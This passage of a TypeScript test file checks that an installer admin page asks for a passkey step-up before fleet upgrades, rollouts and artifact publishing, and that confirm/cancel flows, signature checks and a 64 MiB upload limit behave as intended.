    const url = String(input)
    const method = init?.method ?? 'GET'
    if (url === '/api/v1/installer/artifacts') return Promise.resolve(makeArtifactListResponse([]))
    if (url.includes('presence/begin')) {
      return Promise.resolve(
        jsonRes(200, envelope({
          publicKey: {
            challenge: 'Y2hhbGxlbmdl',
            timeout: 60000,
            rpId: 'localhost',
            allowCredentials: [{ type: 'public-key', id: 'Y3JlZA', transports: ['internal'] }],
            userVerification: 'required',
          },
        })),
      )
    }
    if (url.includes('presence/finish')) {
      return Promise.resolve(jsonRes(200, envelope({ presence_token: 'tap-token-1', expires_in: 30 })))
    }
    if (url === '/api/v1/stewards/upgrade' && method === 'POST') {
      const token = new Headers(init?.headers).get('X-Presence-Token')
      if (opts.presence && token !== 'tap-token-1') {
        return Promise.resolve(
          jsonRes(401, { error: 'step_up_required' }, {
            'WWW-Authenticate':
              'CFGMS-StepUp realm="cfgms", required="strong", presence="required", permission="installer:dispatch:steward"',
          }),
        )
      }
      return Promise.resolve(jsonRes(202, envelope({ upgrade_id: 'up-1', steward_count: 2, status: 'accepted' })))
    }
    if (url === '/api/v1/stewards/upgrade/up-1/rollback') {
      return Promise.resolve(jsonRes(202, envelope({ status: 'accepted' })))
    }
    if (url === '/api/v1/stewards/upgrade/up-1') {
      return Promise.resolve(jsonRes(200, upgradeRecord(opts.status ?? 'dispatched')))
    }
    return Promise.resolve(jsonRes(404, {}))
  })
}

async function fillAndDispatch() {
  renderPage()
  await waitFor(() => expect(screen.getByTestId('upgrade-section')).toBeInTheDocument())
  fireEvent.change(screen.getByRole('textbox', { name: /upgrade target selector/i }), { target: { value: 'os:linux' } })
  fireEvent.change(screen.getByTestId('upgrade-version'), { target: { value: '1.2.3' } })
  fireEvent.change(screen.getByTestId('upgrade-platform'), { target: { value: 'linux' } })
  fireEvent.change(screen.getByTestId('upgrade-arch'), { target: { value: 'amd64' } })
  fireEvent.click(screen.getByTestId('upgrade-dispatch-btn'))
}

describe('InstallerPage upgrade dispatch', () => {
  it('sends X-Presence-Token after the tap', async () => {
    vi.stubGlobal('navigator', { credentials: { get: vi.fn().mockResolvedValue(passkeyCredential) } })
    installUpgradeRoutes({ presence: true })
    await fillAndDispatch()

    await waitFor(() => expect(screen.getByTestId('step-up-overlay')).toBeInTheDocument())
    expect(callsTo('/api/v1/stewards/upgrade')).toHaveLength(1)
    await waitFor(() => screen.getByTestId('step-up-verify-btn'))
    fireEvent.click(screen.getByTestId('step-up-verify-btn'))

    await waitFor(() => expect(callsTo('/api/v1/stewards/upgrade')).toHaveLength(2))
    const retry = callsTo('/api/v1/stewards/upgrade')[1]![1]
    expect(new Headers(retry?.headers).get('X-Presence-Token')).toBe('tap-token-1')
    expect(JSON.parse(String(retry?.body))).toEqual({
      selector: 'os:linux', version: '1.2.3', platform: 'linux', arch: 'amd64',
    })
    await waitFor(() => expect(screen.getByTestId('upgrade-id')).toHaveTextContent('up-1'))
  })

  it('sends no second mutation and says so when the tap is cancelled', async () => {
    const get = vi.fn()
    vi.stubGlobal('navigator', { credentials: { get } })
    installUpgradeRoutes({ presence: true })
    await fillAndDispatch()

    await waitFor(() => expect(screen.getByTestId('step-up-cancel-btn')).toBeInTheDocument())
    fireEvent.click(screen.getByTestId('step-up-cancel-btn'))

    await waitFor(() => expect(screen.getByTestId('upgrade-error')).toHaveTextContent(/cancelled/i))
    expect(callsTo('/api/v1/stewards/upgrade')).toHaveLength(1)
    expect(screen.queryByTestId('upgrade-id')).not.toBeInTheDocument()
  })

  it('shows the upgrade_id and renders the polled status as text', async () => {
    installUpgradeRoutes({ presence: false, status: 'swapped' })
    await fillAndDispatch()
    await waitFor(() => expect(screen.getByTestId('upgrade-status')).toHaveTextContent('swapped'))
    expect(screen.getByTestId('upgrade-id')).toHaveTextContent('up-1')
  })

  it('keeps Dispatch disabled until every field is set', async () => {
    installUpgradeRoutes({ presence: false })
    renderPage()
    await waitFor(() => expect(screen.getByTestId('upgrade-section')).toBeInTheDocument())
    expect(screen.getByTestId('upgrade-dispatch-btn')).toBeDisabled()
  })

  it('shows the server message when dispatch is rejected', async () => {
    fetchMock.mockImplementation((input, init) => {
      if (String(input) === '/api/v1/stewards/upgrade' && init?.method === 'POST') {
        return Promise.resolve(jsonRes(409, { error: { code: 'X', message: 'upgrade already in progress' } }))
      }
      return Promise.resolve(makeArtifactListResponse([]))
    })
    await fillAndDispatch()
    await waitFor(() => expect(screen.getByTestId('upgrade-error')).toHaveTextContent('upgrade already in progress'))
  })
})

describe('InstallerPage upgrade rollback', () => {
  async function dispatched() {
    installUpgradeRoutes({ presence: false, status: 'committed' })
    await fillAndDispatch()
    await waitFor(() => expect(screen.getByTestId('upgrade-id')).toBeInTheDocument())
    fireEvent.change(screen.getByTestId('rollback-version'), { target: { value: '1.2.2' } })
  }

  it('requests no presence tap (exempt route)', async () => {
    await dispatched()
    fireEvent.click(screen.getByTestId('rollback-btn'))
    fireEvent.click(screen.getByTestId('rollback-confirm-btn'))

    await waitFor(() => expect(callsTo('/api/v1/stewards/upgrade/up-1/rollback')).toHaveLength(1))
    const init = callsTo('/api/v1/stewards/upgrade/up-1/rollback')[0]![1]
    expect(new Headers(init?.headers).get('X-Presence-Token')).toBeNull()
    expect(JSON.parse(String(init?.body))).toEqual({ version: '1.2.2' })
    expect(screen.queryByTestId('step-up-overlay')).not.toBeInTheDocument()
    expect(fetchMock.mock.calls.some(([u]) => String(u).includes('presence'))).toBe(false)
    await waitFor(() => expect(screen.getByTestId('rollback-note')).toBeInTheDocument())
  })

  it('sends nothing until Confirm, and Cancel abandons it', async () => {
    await dispatched()
    fireEvent.click(screen.getByTestId('rollback-btn'))
    expect(screen.getByTestId('rollback-confirm-row')).toBeInTheDocument()
    expect(callsTo('/api/v1/stewards/upgrade/up-1/rollback')).toHaveLength(0)
    fireEvent.click(screen.getByTestId('rollback-cancel-btn'))
    expect(screen.queryByTestId('rollback-confirm-row')).not.toBeInTheDocument()
    expect(callsTo('/api/v1/stewards/upgrade/up-1/rollback')).toHaveLength(0)
  })
})

// ── Fleet rollout start, status and halt (Issue #5452) ────────────────────────

function rolloutBody(extra: Record<string, unknown> = {}) {
  return envelope({
    rollout_id: 'ro-1', target_version: '1.2.3', current_ring: 'canary', status: 'in-progress',
    on_version_pct: 0, failed_count: 0, pending_count: 0, health_metrics_available: true,
    rings_completed: 0, rings_total: 3, started_at: '2026-01-01T00:00:00Z', ...extra,
  })
}

function installRolloutRoutes(opts: { presence: boolean; status?: Record<string, unknown> }) {
  fetchMock.mockImplementation((input, init) => {
    const url = String(input)
    const method = init?.method ?? 'GET'
    if (url === '/api/v1/installer/artifacts') return Promise.resolve(makeArtifactListResponse([]))
    if (url.includes('presence/begin')) {
      return Promise.resolve(
        jsonRes(200, envelope({
          publicKey: {
            challenge: 'Y2hhbGxlbmdl', timeout: 60000, rpId: 'localhost',
            allowCredentials: [{ type: 'public-key', id: 'Y3JlZA', transports: ['internal'] }],
            userVerification: 'required',
          },
        })),
      )
    }
    if (url.includes('presence/finish')) {
      return Promise.resolve(jsonRes(200, envelope({ presence_token: 'tap-token-1', expires_in: 30 })))
    }
    if (url === '/api/v1/rollout' && method === 'POST') {
      const token = new Headers(init?.headers).get('X-Presence-Token')
      if (opts.presence && token !== 'tap-token-1') {
        return Promise.resolve(
          jsonRes(401, { error: 'step_up_required' }, {
            'WWW-Authenticate':
              'CFGMS-StepUp realm="cfgms", required="strong", presence="required", permission="installer:dispatch:steward"',
          }),
        )
      }
      return Promise.resolve(jsonRes(202, envelope({ rollout_id: 'ro-1', status: 'in-progress' })))
    }
    if (url === '/api/v1/rollout/ro-1/halt') return Promise.resolve(jsonRes(200, envelope({ rollout_id: 'ro-1', status: 'halted' })))
    if (url === '/api/v1/rollout/ro-1') return Promise.resolve(jsonRes(200, rolloutBody(opts.status)))
    return Promise.resolve(jsonRes(404, {}))
  })
}

async function fillAndStart() {
  renderPage()
  await waitFor(() => expect(screen.getByTestId('rollout-section')).toBeInTheDocument())
  fireEvent.change(screen.getByTestId('rollout-version'), { target: { value: '1.2.3' } })
  fireEvent.change(screen.getByTestId('rollout-tenant'), { target: { value: 'root' } })
  fireEvent.click(screen.getByTestId('rollout-start-btn'))
}

describe('InstallerPage rollout start', () => {
  it('sends X-Presence-Token after the tap', async () => {
    vi.stubGlobal('navigator', { credentials: { get: vi.fn().mockResolvedValue(passkeyCredential) } })
    installRolloutRoutes({ presence: true })
    await fillAndStart()

    await waitFor(() => expect(screen.getByTestId('step-up-overlay')).toBeInTheDocument())
    expect(callsTo('/api/v1/rollout')).toHaveLength(1)
    await waitFor(() => screen.getByTestId('step-up-verify-btn'))
    fireEvent.click(screen.getByTestId('step-up-verify-btn'))

    await waitFor(() => expect(callsTo('/api/v1/rollout')).toHaveLength(2))
    const retry = callsTo('/api/v1/rollout')[1]![1]
    expect(new Headers(retry?.headers).get('X-Presence-Token')).toBe('tap-token-1')
    expect(JSON.parse(String(retry?.body))).toEqual({ target_version: '1.2.3', tenant_id: 'root' })
    await waitFor(() => expect(screen.getByTestId('rollout-id')).toHaveTextContent('ro-1'))
  })

  it('sends no second mutation and says so when the tap is cancelled', async () => {
    vi.stubGlobal('navigator', { credentials: { get: vi.fn() } })
    installRolloutRoutes({ presence: true })
    await fillAndStart()

    await waitFor(() => expect(screen.getByTestId('step-up-cancel-btn')).toBeInTheDocument())
    fireEvent.click(screen.getByTestId('step-up-cancel-btn'))

    await waitFor(() => expect(screen.getByTestId('rollout-error')).toHaveTextContent(/cancelled/i))
    expect(callsTo('/api/v1/rollout')).toHaveLength(1)
    expect(screen.queryByTestId('rollout-id')).not.toBeInTheDocument()
  })

  it('keeps Start disabled until a version is set', async () => {
    installRolloutRoutes({ presence: false })
    renderPage()
    await waitFor(() => expect(screen.getByTestId('rollout-section')).toBeInTheDocument())
    expect(screen.getByTestId('rollout-start-btn')).toBeDisabled()
  })
})

describe('InstallerPage rollout status', () => {
  it('shows metrics unavailable instead of zeros', async () => {
    installRolloutRoutes({
      presence: false,
      status: { health_metrics_available: false, health_metrics_error: 'ring health metrics are unavailable: the fleet query failed' },
    })
    await fillAndStart()
    await waitFor(() => expect(screen.getByTestId('rollout-metrics-unavailable')).toHaveTextContent(/metrics unavailable/i))
    expect(screen.getByTestId('rollout-metrics-unavailable')).toHaveTextContent('the fleet query failed')
    expect(screen.queryByTestId('rollout-on-version')).not.toBeInTheDocument()
    expect(screen.queryByTestId('rollout-failed')).not.toBeInTheDocument()
    expect(screen.queryByTestId('rollout-pending')).not.toBeInTheDocument()
  })

  it('renders counts when metrics are available', async () => {
    installRolloutRoutes({ presence: false, status: { on_version_pct: 40, failed_count: 2, pending_count: 5 } })
    await fillAndStart()
    await waitFor(() => expect(screen.getByTestId('rollout-on-version')).toHaveTextContent('40%'))
    expect(screen.getByTestId('rollout-failed')).toHaveTextContent('2')
    expect(screen.getByTestId('rollout-pending')).toHaveTextContent('5')
    expect(screen.getByTestId('rollout-ring')).toHaveTextContent('canary')
  })
})

describe('InstallerPage rollout halt', () => {
  async function started() {
    installRolloutRoutes({ presence: false })
    await fillAndStart()
    await waitFor(() => expect(screen.getByTestId('rollout-status')).toHaveTextContent('in-progress'))
  }

  it('requests no presence tap', async () => {
    await started()
    fireEvent.click(screen.getByTestId('halt-btn'))
    fireEvent.click(screen.getByTestId('halt-confirm-btn'))

    await waitFor(() => expect(callsTo('/api/v1/rollout/ro-1/halt')).toHaveLength(1))
    const init = callsTo('/api/v1/rollout/ro-1/halt')[0]![1]
    expect(new Headers(init?.headers).get('X-Presence-Token')).toBeNull()
    expect(screen.queryByTestId('step-up-overlay')).not.toBeInTheDocument()
    expect(fetchMock.mock.calls.some(([u]) => String(u).includes('presence'))).toBe(false)
    await waitFor(() => expect(screen.getByTestId('halt-note')).toBeInTheDocument())
  })

  it('sends nothing until Confirm, and Cancel abandons it', async () => {
    await started()
    fireEvent.click(screen.getByTestId('halt-btn'))
    expect(screen.getByTestId('halt-confirm-row')).toBeInTheDocument()
    expect(callsTo('/api/v1/rollout/ro-1/halt')).toHaveLength(0)
    fireEvent.click(screen.getByTestId('halt-cancel-btn'))
    expect(screen.queryByTestId('halt-confirm-row')).not.toBeInTheDocument()
    expect(callsTo('/api/v1/rollout/ro-1/halt')).toHaveLength(0)
  })
})

// ── Artifact upload, delete and publish (Issue #5456) ─────────────────────────

const ARTIFACT_PATH = '/api/v1/installer/artifacts/linux/amd64'
const PUBLISH_PREFIX = '/api/v1/installer/steward-binaries/1.2.3/linux/amd64'

function installArtifactRoutes(opts: { presence: boolean }) {
  fetchMock.mockImplementation((input, init) => {
    const url = String(input)
    const method = init?.method ?? 'GET'
    if (url === '/api/v1/installer/artifacts') return Promise.resolve(makeArtifactListResponse([makeArtifact()]))
    if (url.includes('presence/begin')) {
      return Promise.resolve(
        jsonRes(200, envelope({
          publicKey: {
            challenge: 'Y2hhbGxlbmdl',
            timeout: 60000,
            rpId: 'localhost',
            allowCredentials: [{ type: 'public-key', id: 'Y3JlZA', transports: ['internal'] }],
            userVerification: 'required',
          },
        })),
      )
    }
    if (url.includes('presence/finish')) {
      return Promise.resolve(jsonRes(200, envelope({ presence_token: 'tap-token-1', expires_in: 30 })))
    }
    if (method !== 'GET') {
      const token = new Headers(init?.headers).get('X-Presence-Token')
      if (opts.presence && token !== 'tap-token-1') {
        return Promise.resolve(
          jsonRes(401, { error: 'step_up_required' }, {
            'WWW-Authenticate':
              'CFGMS-StepUp realm="cfgms", required="strong", presence="required", permission="installer:publish:steward"',
          }),
        )
      }
      return Promise.resolve(jsonRes(200, envelope({})))
    }
    return Promise.resolve(jsonRes(404, {}))
  })
}

function mutationCalls() {
  return fetchMock.mock.calls.filter(([url, init]) => {
    const u = String(url)
    return (init?.method ?? 'GET') !== 'GET' && !u.includes('presence')
  })
}

async function tap() {
  await waitFor(() => expect(screen.getByTestId('step-up-overlay')).toBeInTheDocument())
  await waitFor(() => screen.getByTestId('step-up-verify-btn'))
  fireEvent.click(screen.getByTestId('step-up-verify-btn'))
}

async function pickUpload(file: File) {
  renderPage()
  await waitFor(() => expect(screen.getByTestId('artifact-manage-section')).toBeInTheDocument())
  fireEvent.change(screen.getByTestId('upload-platform'), { target: { value: 'linux' } })
  fireEvent.change(screen.getByTestId('upload-arch'), { target: { value: 'amd64' } })
  fireEvent.change(screen.getByTestId('upload-file'), { target: { files: [file] } })
  fireEvent.click(screen.getByTestId('upload-btn'))
}

async function fillPublish(file: File, signature = 'c2ln') {
  renderPage()
  await waitFor(() => expect(screen.getByTestId('artifact-manage-section')).toBeInTheDocument())
  fireEvent.change(screen.getByTestId('publish-version'), { target: { value: '1.2.3' } })
  fireEvent.change(screen.getByTestId('publish-platform'), { target: { value: 'linux' } })
  fireEvent.change(screen.getByTestId('publish-arch'), { target: { value: 'amd64' } })
  fireEvent.change(screen.getByTestId('publish-signature'), { target: { value: signature } })
  fireEvent.change(screen.getByTestId('publish-file'), { target: { files: [file] } })
}

describe('InstallerPage upload, delete and publish', () => {
  beforeEach(() => {
    vi.stubGlobal('navigator', { credentials: { get: vi.fn().mockResolvedValue(passkeyCredential) } })
  })

  it('send X-Presence-Token after the tap', async () => {
    installArtifactRoutes({ presence: true })
    await pickUpload(new File(['payload'], 'a.bin'))
    await tap()
    await waitFor(() => expect(mutationCalls()).toHaveLength(2))
    expect(new Headers(mutationCalls()[1]![1]?.headers).get('X-Presence-Token')).toBe('tap-token-1')
    expect(mutationCalls()[1]![1]?.method).toBe('PUT')
    cleanup()

    fetchMock.mockClear()
    installArtifactRoutes({ presence: true })
    renderPage()
    await waitFor(() => screen.getByTestId('delete-linux-amd64'))
    fireEvent.click(screen.getByTestId('delete-linux-amd64'))
    expect(mutationCalls()).toHaveLength(0)
    fireEvent.click(screen.getByTestId('delete-confirm-linux-amd64'))
    await tap()
    await waitFor(() => expect(mutationCalls()).toHaveLength(2))
    expect(mutationCalls()[1]![0]).toBe(ARTIFACT_PATH)
    expect(mutationCalls()[1]![1]?.method).toBe('DELETE')
    expect(new Headers(mutationCalls()[1]![1]?.headers).get('X-Presence-Token')).toBe('tap-token-1')
    cleanup()

    fetchMock.mockClear()
    installArtifactRoutes({ presence: true })
    await fillPublish(new File(['bin'], 'steward'))
    fireEvent.click(screen.getByTestId('publish-btn'))
    await tap()
    await waitFor(() => expect(mutationCalls()).toHaveLength(2))
    expect(mutationCalls()[1]![0]).toBe(`${PUBLISH_PREFIX}?signature=c2ln`)
    expect(new Headers(mutationCalls()[1]![1]?.headers).get('X-Presence-Token')).toBe('tap-token-1')
  })

  it('upload replays the full body after the tap', async () => {
    installArtifactRoutes({ presence: true })
    const file = new File(['full-body-bytes'], 'a.bin')
    await pickUpload(file)
    await tap()
    await waitFor(() => expect(mutationCalls()).toHaveLength(2))
    const [first, second] = mutationCalls()
    expect(first![0]).toBe(ARTIFACT_PATH)
    expect(first![1]?.body).toBe(file)
    expect(second![1]?.body).toBe(file)
    expect(await (second![1]?.body as Blob).text()).toBe('full-body-bytes')
  })

  it('upload says so and sends no second mutation when the tap is cancelled', async () => {
    installArtifactRoutes({ presence: true })
    await pickUpload(new File(['x'], 'a.bin'))
    await waitFor(() => screen.getByTestId('step-up-cancel-btn'))
    fireEvent.click(screen.getByTestId('step-up-cancel-btn'))
    await waitFor(() => expect(screen.getByTestId('artifact-error')).toHaveTextContent(/cancelled/i))
    expect(mutationCalls()).toHaveLength(1)
  })

  it('delete sends nothing until Confirm, and Cancel abandons it', async () => {
    installArtifactRoutes({ presence: false })
    renderPage()
    await waitFor(() => screen.getByTestId('delete-linux-amd64'))
    fireEvent.click(screen.getByTestId('delete-linux-amd64'))
    fireEvent.click(screen.getByTestId('delete-cancel-linux-amd64'))
    expect(mutationCalls()).toHaveLength(0)
    expect(screen.getByTestId('delete-linux-amd64')).toBeInTheDocument()
  })

  it('publish refuses without a signature', async () => {
    installArtifactRoutes({ presence: false })
    await fillPublish(new File(['bin'], 'steward'), '  ')
    expect(screen.getByTestId('publish-btn')).toBeDisabled()
    fireEvent.click(screen.getByTestId('publish-btn'))
    expect(mutationCalls()).toHaveLength(0)
  })

  it('publish refuses a file over 64 MiB and states the limit', async () => {
    installArtifactRoutes({ presence: false })
    const big = new File(['x'], 'big')
    Object.defineProperty(big, 'size', { value: 64 * 1024 * 1024 + 1 })
    await fillPublish(big)
    fireEvent.click(screen.getByTestId('publish-btn'))
    await waitFor(() => expect(screen.getByTestId('artifact-error')).toHaveTextContent('64 MiB'))
    expect(mutationCalls()).toHaveLength(0)
  })
})
